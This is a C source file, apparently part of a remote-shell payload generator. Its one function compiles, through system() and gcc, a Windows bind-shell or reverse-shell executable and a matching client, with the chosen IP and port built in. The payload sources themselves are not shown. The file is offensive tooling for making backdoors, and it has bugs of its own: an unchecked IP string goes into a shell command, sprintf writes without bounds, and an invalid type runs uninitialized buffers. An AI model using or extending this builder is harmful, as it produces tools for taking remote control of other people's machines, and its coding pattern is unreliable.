#include "shell.h"
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>

// Shell struct defined in .h file

void createShellExecutable(struct Shell shell) {
    char shellcmd[256];
    char clientcmd[256];

    system("mkdir output");

    // use gcc to create the shell executable with the correct params
    if (shell.type == 0){
        printf("Creating bind shell executable...\n");
        sprintf(shellcmd, "gcc -D PORT=%d -D IP=%s -o output/bshell.exe payloads/bindshell.c -lws2_32", shell.port, shell.ip);
        printf("Creating client...\n");
        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/bclient.exe clients/bindshell_client.c -lws2_32", shell.port, shell.ip);
    }
    else if (shell.type == 1){
        printf("Creating reverse shell executable...\n");
        sprintf(shellcmd, "gcc -D PORT=%d -D IP=%s -o output/rshell.exe payloads/reverseshell.c -lws2_32", shell.port, shell.ip);
        printf("Creating client...\n");
        sprintf(clientcmd, "gcc -D PORT=%d -D IP=%s -o output/rclient.exe clients/reverseshell_client.c -lws2_32", shell.port, shell.ip);

    }
    else{
        printf("Invalid type.\n");
    }
    system(shellcmd);
    system(clientcmd);

}



